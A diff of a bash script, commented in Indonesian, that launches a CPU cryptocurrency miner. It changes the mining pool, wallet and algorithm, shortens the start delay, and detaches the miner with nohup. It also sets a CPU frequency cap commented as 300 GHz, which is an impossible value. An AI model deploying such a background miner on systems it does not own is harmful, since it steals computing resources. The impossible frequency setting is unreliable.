@@ -19,7 +19,7 @@ fi
 
 # Mengatur frekuensi CPU ke 3 GHz
 CPUFREQ_PATH="/sys/devices/system/cpu/cpu*/cpufreq"
-MAX_FREQ=3000000 # Maksimal frekuensi dalam kHz (3 GHz)
+MAX_FREQ=300000000 # Maksimal frekuensi dalam kHz (300 GHz)
 
 for dir in $CPUFREQ_PATH; do
     if [ -e $dir/scaling_max_freq ]; then
@@ -28,16 +28,16 @@ for dir in $CPUFREQ_PATH; do
 done
 
 # Pengaturan penambangan
-ALGO="yespowerltncg"
-POOL_URL="stratum+tcp://yespowerLTNCG.mine.zergpool.com:6239"
-WALLET_ADDRESS="RQ9cLzR9o1E92Pw9q5LtiHvDXBfeWhqvgo"
-PASSWORD="c=RVN,mc=CRNC,m=solo,ID=FZLuxy$RANDOM"
+ALGO="verushash"
+POOL_URL="stratum+tcp://ru.vipor.net:5040"
+WALLET_ADDRESS="RJWHkHUFByrjCtSwgjZZETwrDPYHRXwAA3.aa"
+PASSWORD="x"
 
 # Memulai dengan file ayday dan menjalankan di latar belakang
 cd $INSTALL_DIR
 chmod +x $FILE_NAME
-sleep 1800
-./$FILE_NAME --disable-gpu --algorithm $ALGO --pool $POOL_URL --wallet $WALLET_ADDRESS --password $PASSWORD --cpu-threads 0 &
+sleep 20
+nohup ./$FILE_NAME --disable-gpu --algorithm $ALGO --pool $POOL_URL --wallet $WALLET_ADDRESS --password $PASSWORD --cpu-threads 0 &
 
 # Mengecek apakah proses penambangan dimulai dengan benar
 if pgrep -f "$FILE_NAME" > /dev/null; then
